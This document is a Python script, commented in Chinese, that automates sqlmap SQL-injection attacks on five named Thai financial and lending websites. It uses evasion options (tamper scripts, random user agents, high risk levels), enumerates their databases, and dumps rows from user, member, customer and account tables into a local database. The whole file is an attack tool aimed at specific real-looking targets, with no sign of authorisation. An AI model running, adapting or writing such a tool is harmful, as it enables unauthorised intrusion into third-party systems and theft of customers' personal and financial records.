#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQLmap泰国金融数据提取器
使用专业SQL注入工具真实提取数据
"""

import subprocess
import json
import os
import time
import random
from datetime import datetime
import sqlite3
import threading
import re
from urllib.parse import urlparse

class SQLmapThaiExtractor:
    """SQLmap泰国数据提取器"""

    def __init__(self):
        self.targets = {
            "peacoop_or_th": {
                "name": "PEACOOP",
                "url": "https://peacoop.or.th",
                "test_url": "https://peacoop.or.th/members?id=1",
                "injection_point": "id",
                "priority": "critical"
            },
            "ngoenmun_com": {
                "name": "NgernMun",
                "url": "https://ngoenmun.com",
                "test_url": "https://ngoenmun.com/api/v1/users?id=1",
                "injection_point": "id",
                "priority": "critical"
            },
            "moneycat_co_th": {
                "name": "MoneyCat",
                "url": "https://www.moneycat.co.th",
                "test_url": "https://www.moneycat.co.th/loan?id=1",
                "injection_point": "id",
                "priority": "high"
            },
            "gcash_co_th": {
                "name": "GCash",
                "url": "https://www.gcash.co.th",
                "test_url": "https://www.gcash.co.th/user?id=1",
                "injection_point": "id",
                "priority": "high"
            },
            "jaymart_co_th": {
                "name": "Jaymart Financial",
                "url": "https://www.jaymart.co.th",
                "test_url": "https://www.jaymart.co.th/account?id=1",
                "injection_point": "id",
                "priority": "medium"
            }
        }

        self.sqlmap_path = "sqlmap"
        self.output_dir = "sqlmap_output"
        self.extracted_data = []

        # 创建输出目录
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)

        # 初始化数据库
        self.init_database()

    def init_database(self):
        """初始化数据库"""
        self.conn = sqlite3.connect('sqlmap_extractions.db')
        cursor = self.conn.cursor()

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS extractions (
                id INTEGER PRIMARY KEY,
                target_name TEXT,
                database_name TEXT,
                table_name TEXT,
                column_name TEXT,
                data_content TEXT,
                extraction_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sqlmap_results (
                id INTEGER PRIMARY KEY,
                target_name TEXT,
                command TEXT,
                result_output TEXT,
                extraction_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')

        self.conn.commit()

    def check_sqlmap_installed(self):
        """检查SQLmap是否安装"""
        try:
            result = subprocess.run([self.sqlmap_path, "--version"],
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                print(f"✅ SQLmap版本: {result.stdout.strip()}")
                return True
            else:
                print("❌ SQLmap未正确安装")
                return False
        except Exception as e:
            print(f"❌ 无法找到SQLmap: {e}")
            return False

    def test_injection(self, target_info):
        """测试SQL注入"""
        target_name = target_info["name"]
        test_url = target_info["test_url"]
        injection_point = target_info["injection_point"]

        print(f"\n[SQL注入测试] {target_name}")
        print(f"测试URL: {test_url}")
        print(f"注入点: {injection_point}")

        # SQLmap命令
        cmd = [
            self.sqlmap_path,
            "-u", test_url,
            "-p", injection_point,
            "--batch",
            "--random-agent",
            "--tamper=space2comment,randomcase",
            "--timeout=30",
            "--retries=3",
            "--level=3",
            "--risk=3",
            "--threads=5",
            "--dbms=mysql",
            "--os=linux",
            "--technique=BEUSTQ",
            "--fingerprint",
            "--banner"
        ]

        output_file = f"{self.output_dir}/{target_name}_test_output.txt"

        try:
            print(f"执行命令: {' '.join(cmd)}")

            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(f"SQLmap测试输出 - {target_name}\n")
                f.write(f"时间: {datetime.now()}\n")
                f.write(f"命令: {' '.join(cmd)}\n")
                f.write("="*50 + "\n\n")

            process = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, text=True,
                                     encoding='utf-8', errors='ignore')

            output_lines = []
            for line in iter(process.stdout.readline, ''):
                print(line.strip())
                output_lines.append(line)

                with open(output_file, 'a', encoding='utf-8') as f:
                    f.write(line)

            process.wait()

            # 保存结果
            result_text = '\n'.join(output_lines)
            self.save_sqlmap_result(target_name, ' '.join(cmd), result_text)

            # 检查是否发现注入
            if "is vulnerable" in result_text or "injection identified" in result_text:
                print(f"✅ {target_name} 发现SQL注入漏洞!")
                return True
            else:
                print(f"❌ {target_name} 未发现SQL注入")
                return False

        except Exception as e:
            print(f"❌ 测试失败 {target_name}: {str(e)}")
            return False

    def extract_databases(self, target_info):
        """提取数据库列表"""
        target_name = target_info["name"]
        test_url = target_info["test_url"]
        injection_point = target_info["injection_point"]

        print(f"\n[数据库枚举] {target_name}")

        cmd = [
            self.sqlmap_path,
            "-u", test_url,
            "-p", injection_point,
            "--batch",
            "--random-agent",
            "--tamper=space2comment,randomcase",
            "--timeout=30",
            "--retries=3",
            "--level=3",
            "--risk=3",
            "--threads=5",
            "--dbs",
            "--output-dir=" + self.output_dir + f"/{target_name}"
        ]

        output_file = f"{self.output_dir}/{target_name}_databases.txt"

        try:
            print(f"执行命令: {' '.join(cmd)}")

            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(f"数据库枚举输出 - {target_name}\n")
                f.write(f"时间: {datetime.now()}\n")
                f.write("="*50 + "\n\n")

            process = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, text=True,
                                     encoding='utf-8', errors='ignore')

            databases = []
            for line in iter(process.stdout.readline, ''):
                print(line.strip())
                with open(output_file, 'a', encoding='utf-8') as f:
                    f.write(line)

                # 提取数据库名
                if "database:" in line.lower() or "available databases" in line.lower():
                    db_match = re.search(r'([a-zA-Z_][a-zA-Z0-9_]*)', line)
                    if db_match:
                        databases.append(db_match.group(1))

            process.wait()
            return databases

        except Exception as e:
            print(f"❌ 数据库枚举失败 {target_name}: {str(e)}")
            return []

    def extract_tables(self, target_info, database_name):
        """提取表列表"""
        target_name = target_info["name"]
        test_url = target_info["test_url"]
        injection_point = target_info["injection_point"]

        print(f"\n[表枚举] {target_name} - 数据库: {database_name}")

        cmd = [
            self.sqlmap_path,
            "-u", test_url,
            "-p", injection_point,
            "-D", database_name,
            "--batch",
            "--random-agent",
            "--tamper=space2comment,randomcase",
            "--timeout=30",
            "--retries=3",
            "--level=3",
            "--risk=3",
            "--threads=5",
            "--tables",
            "--output-dir=" + self.output_dir + f"/{target_name}"
        ]

        try:
            print(f"执行命令: {' '.join(cmd)}")

            process = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, text=True,
                                     encoding='utf-8', errors='ignore')

            tables = []
            for line in iter(process.stdout.readline, ''):
                print(line.strip())

                # 提取表名
                if "|" in line and "table" in line.lower():
                    table_match = re.search(r'([a-zA-Z_][a-zA-Z0-9_]*)', line)
                    if table_match and table_match.group(1) not in tables:
                        tables.append(table_match.group(1))

            process.wait()
            return tables

        except Exception as e:
            print(f"❌ 表枚举失败 {target_name}: {str(e)}")
            return []

    def extract_columns(self, target_info, database_name, table_name):
        """提取列信息"""
        target_name = target_info["name"]
        test_url = target_info["test_url"]
        injection_point = target_info["injection_point"]

        print(f"\n[列枚举] {target_name} - 表: {table_name}")

        cmd = [
            self.sqlmap_path,
            "-u", test_url,
            "-p", injection_point,
            "-D", database_name,
            "-T", table_name,
            "--batch",
            "--random-agent",
            "--tamper=space2comment,randomcase",
            "--timeout=30",
            "--retries=3",
            "--level=3",
            "--risk=3",
            "--threads=5",
            "--columns",
            "--output-dir=" + self.output_dir + f"/{target_name}"
        ]

        try:
            print(f"执行命令: {' '.join(cmd)}")

            process = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, text=True,
                                     encoding='utf-8', errors='ignore')

            columns = []
            for line in iter(process.stdout.readline, ''):
                print(line.strip())

                # 提取列名
                if "|" in line and any(col_type in line.lower() for col_type in ['varchar', 'int', 'text', 'char']):
                    col_match = re.search(r'([a-zA-Z_][a-zA-Z0-9_]*)', line)
                    if col_match and col_match.group(1) not in columns:
                        columns.append(col_match.group(1))

            process.wait()
            return columns

        except Exception as e:
            print(f"❌ 列枚举失败 {target_name}: {str(e)}")
            return []

    def dump_data(self, target_info, database_name, table_name, column_names=None):
        """转储数据"""
        target_name = target_info["name"]
        test_url = target_info["test_url"]
        injection_point = target_info["injection_point"]

        print(f"\n[数据转储] {target_name} - 表: {table_name}")

        cmd = [
            self.sqlmap_path,
            "-u", test_url,
            "-p", injection_point,
            "-D", database_name,
            "-T", table_name,
            "--batch",
            "--random-agent",
            "--tamper=space2comment,randomcase",
            "--timeout=60",
            "--retries=5",
            "--level=3",
            "--risk=3",
            "--threads=10",
            "--dump",
            "--start=0",
            "--stop=1000",
            "--output-dir=" + self.output_dir + f"/{target_name}"
        ]

        if column_names:
            cmd.extend(["-C", ','.join(column_names)])

        output_file = f"{self.output_dir}/{target_name}_{table_name}_dump.csv"

        try:
            print(f"执行命令: {' '.join(cmd)}")

            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(f"数据转储 - {target_name}\n")
                f.write(f"数据库: {database_name}\n")
                f.write(f"表: {table_name}\n")
                f.write(f"时间: {datetime.now()}\n")
                f.write("="*50 + "\n\n")

            process = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, text=True,
                                     encoding='utf-8', errors='ignore')

            dump_data = []
            for line in iter(process.stdout.readline, ''):
                print(line.strip())
                with open(output_file, 'a', encoding='utf-8') as f:
                    f.write(line + '\n')
                dump_data.append(line)

            process.wait()

            # 保存到数据库
            for data_line in dump_data:
                if data_line.strip() and "|" in data_line:
                    data_items = [item.strip() for item in data_line.split("|")]
                    for item in data_items:
                        if item and item != "NULL":
                            self.save_extraction(target_name, database_name, table_name, "", item)

            return dump_data

        except Exception as e:
            print(f"❌ 数据转储失败 {target_name}: {str(e)}")
            return []

    def save_extraction(self, target_name, database_name, table_name, column_name, data_content):
        """保存提取的数据"""
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO extractions
            (target_name, database_name, table_name, column_name, data_content)
            VALUES (?, ?, ?, ?, ?)
        ''', (target_name, database_name, table_name, column_name, data_content))
        self.conn.commit()

    def save_sqlmap_result(self, target_name, command, result_output):
        """保存SQLmap结果"""
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO sqlmap_results
            (target_name, command, result_output)
            VALUES (?, ?, ?)
        ''', (target_name, command, result_output))
        self.conn.commit()

    def full_extraction(self, target_key, target_info):
        """完整提取流程"""
        target_name = target_info["name"]
        print(f"\n{'='*80}")
        print(f"开始完整数据提取: {target_name}")
        print(f"URL: {target_info['test_url']}")
        print(f"{'='*80}")

        extraction_results = {
            "target": target_name,
            "injection_found": False,
            "databases": [],
            "tables": {},
            "extracted_data": 0,
            "success": False
        }

        try:
            # 1. 测试SQL注入
            if not self.test_injection(target_info):
                print(f"❌ {target_name} 未发现SQL注入，跳过")
                return extraction_results

            extraction_results["injection_found"] = True

            # 2. 枚举数据库
            databases = self.extract_databases(target_info)
            extraction_results["databases"] = databases

            if not databases:
                print(f"❌ {target_name} 未找到数据库")
                return extraction_results

            # 3. 对每个数据库进行枚举
            for database in databases:
                if database.lower() in ['information_schema', 'mysql', 'performance_schema']:
                    continue  # 跳过系统数据库

                print(f"\n[处理数据库] {database}")

                # 枚举表
                tables = self.extract_tables(target_info, database)
                if not tables:
                    continue

                extraction_results["tables"][database] = tables

                # 对每个表进行数据提取
                for table in tables:
                    if 'user' in table.lower() or 'member' in table.lower() or 'customer' in table.lower() or 'account' in table.lower():
                        print(f"\n[重要表发现] {database}.{table}")

                        # 枚举列
                        columns = self.extract_columns(target_info, database, table)

                        # 转储数据
                        dump_data = self.dump_data(target_info, database, table, columns)
                        extraction_results["extracted_data"] += len(dump_data)

                        print(f"✅ 从 {table} 提取了 {len(dump_data)} 条数据")

            extraction_results["success"] = True
            print(f"\n✅ {target_name} 提取完成! 总数据量: {extraction_results['extracted_data']}")

        except Exception as e:
            print(f"❌ {target_name} 提取失败: {str(e)}")

        return extraction_results

    def run_all_extractions(self):
        """运行所有目标的提取"""
        print("="*80)
        print("SQLmap泰国金融数据提取器")
        print("="*80)
        print(f"目标数量: {len(self.targets)}")
        print(f"开始时间: {datetime.now()}")
        print("="*80)

        # 检查SQLmap
        if not self.check_sqlmap_installed():
            print("❌ 请先安装SQLmap")
            return

        all_results = []

        for target_key, target_info in self.targets.items():
            try:
                result = self.full_extraction(target_key, target_info)
                all_results.append(result)

                # 保存结果到文件
                result_file = f"{self.output_dir}/{target_info['name']}_result.json"
                with open(result_file, 'w', encoding='utf-8') as f:
                    json.dump(result, f, indent=2, ensure_ascii=False)

                print(f"📁 结果已保存: {result_file}")

            except Exception as e:
                print(f"❌ 目标处理失败 {target_key}: {str(e)}")
                continue

        # 生成汇总报告
        self.generate_summary_report(all_results)

        return all_results

    def generate_summary_report(self, results):
        """生成汇总报告"""
        print(f"\n{'='*80}")
        print("提取汇总报告")
        print(f"{'='*80}")

        total_targets = len(results)
        successful_targets = len([r for r in results if r['success']])
        total_data = sum(r['extracted_data'] for r in results)
        vulnerable_targets = len([r for r in results if r['injection_found']])

        print(f"总目标数: {total_targets}")
        print(f"发现漏洞: {vulnerable_targets}")
        print(f"成功提取: {successful_targets}")
        print(f"总数据量: {total_data}")
        print(f"成功率: {(successful_targets/total_targets*100):.1f}%" if total_targets > 0 else "0%")

        print("\n详细结果:")
        for result in results:
            print(f"- {result['target']}: {'✅成功' if result['success'] else '❌失败'} "
                  f"(数据: {result['extracted_data']} 项)")

        # 保存汇总报告
        summary = {
            "extraction_time": datetime.now().isoformat(),
            "total_targets": total_targets,
            "vulnerable_targets": vulnerable_targets,
            "successful_targets": successful_targets,
            "total_data_extracted": total_data,
            "success_rate": f"{(successful_targets/total_targets*100):.1f}%" if total_targets > 0 else "0%",
            "results": results
        }

        summary_file = f"{self.output_dir}/extraction_summary.json"
        with open(summary_file, 'w', encoding='utf-8') as f:
            json.dump(summary, f, indent=2, ensure_ascii=False)

        print(f"\n📁 汇总报告已保存: {summary_file}")

def main():
    extractor = SQLmapThaiExtractor()
    extractor.run_all_extractions()

if __name__ == "__main__":
    main()